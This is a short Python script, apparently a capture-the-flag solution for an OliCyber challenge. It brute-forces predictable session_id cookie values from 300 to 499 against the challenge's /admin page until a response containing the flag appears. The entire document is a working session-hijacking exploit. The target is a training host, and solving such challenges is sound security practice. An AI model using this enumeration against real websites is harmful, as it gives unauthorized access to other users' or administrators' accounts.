import requests

for i in range(300, 500):
    r = requests.get("http://too-small-reminder.challs.olicyber.it/admin", cookies={"session_id":f"{i}"})

    if "flag" in r.text.lower():
        print(r.text)
        break
    else:
        print(r.text.replace("\n", ""))